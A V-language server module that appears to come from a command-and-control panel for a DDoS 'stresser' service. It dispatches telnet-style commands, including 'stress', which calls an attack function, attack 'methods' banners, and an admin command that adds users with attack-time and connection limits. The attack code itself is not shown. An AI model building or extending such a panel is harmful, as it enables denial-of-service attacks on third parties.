module server

import net
import banner_sys
import wocky_uix
import wocky_utils
import config 
import auth
import utils


//cmds
import commands

pub struct ServerAssets {
	pub mut:
		empty_c int
		cnc_port string
		clients []net.TcpConn

}

pub struct Test{
	pub mut:
		lul []ServerAssets
}

pub fn cmd_handler(mut socket net.TcpConn, data string, username string) {
	mut b := banner_sys.Banner{username: username, file: "ui"}
	mut wuix := wocky_uix.UIX_Func{}
	mut c_s := utils.Wocky_Settings{}
	b.clear_screen(mut socket)
	mut hostname_cursor := c_s.get_settings()[1].split(",")
	if data.len == 0 {
		socket.write_string(config.Clear) or { 0 }
		b.start_banner_output(mut socket)
		b.set_bannerfile("text")
		b.read_banner_text(mut socket)
		wuix.sock_move_cursor(mut socket, 21, 37)
	} else {
		if data == "" { return }
		/*
		Struct Declaring
		*/
		mut c := config.Config{}

		// Command Parsing
		if data.contains(" ") {
			c.set_config_info((data.split(" ")[0]), data, (data.split(" ")), ((data.split(" ")).len))
		} else { c.set_config_info(data, data, [data], data.len) }
		
		// Command Handling
		match c.cmd {
			"home" {
				socket.write_string(config.Clear) or { 0 }
				b.set_bannerfile("home")
				b.start_banner_output(mut socket)
				b.set_bannerfile("text")
				b.read_banner_text(mut socket)
				b.set_bannerfile("home_text")
			}
			"help" {
				b.set_bannerfile("help")
				b.read_banner_text(mut socket)
			}
			"help2" {
				b.set_bannerfile("help2")
				b.read_banner_text(mut socket)
			}
			"clear" {
				b.clear_screen(mut socket)
			} 
			"whoami" {
				socket.write_string("${username}\r\n") or { 0 }
			}
			"info" {
				mut cf := auth.CrudFunc{user: username}
				socket.write_string(cf.myinfo()) or { 0 }
			}
			"changepw" {
				commands.changepw_cmd(mut socket, data, username)
			}
			"methods" {	
				b.set_bannerfile("methods")
				b.read_banner_text(mut socket)
			}
			"toxic" {
				b.set_bannerfile("toxic_stress")
				b.read_banner_text(mut socket)
			}
			"astra" {
				b.set_bannerfile("astra")
				b.read_banner_text(mut socket)
			}
			"geo" {
				commands.geo_cmd(mut socket, data)
			} 
			"stress" {
				commands.attack_cmd(mut socket, data.split(" "),  username)
			}
			"admin" {
				admin_handler(mut socket, data, username)
			} else {
				wuix.sock_place_text(mut socket, 5, 29, "[x] Error, No command found")
			}
		}

		wuix.sock_move_cursor(mut socket, 21, 37)
		println(data) // send this to the new logger when finished
	}
}

pub fn admin_handler(mut socket net.TcpConn, data string, username string) {
	mut wuix := wocky_uix.UIX_Func{}
	mut arg := data.split(" ")
	mut cmd := arg[0]
	mut admin_cmd := arg[1]

	match admin_cmd {
		"userlist" {
			commands.admin_userlist_cmd(mut socket, data, username)
		}
		"add" {
			mut p := auth.Crud{user: arg[2], pw: arg[3], lvl: arg[4].int(), mtime: arg[5].int(), conn: arg[6].int(), admin: arg[7].int(), expiry: arg[8]}
			wuix.sock_place_text(mut socket, 5, 29, p.add_user())
		} else { 
			socket.write_string("[x] Error, No admin command found!\r\n") or { 0 }
		}
	}
	println('test')
}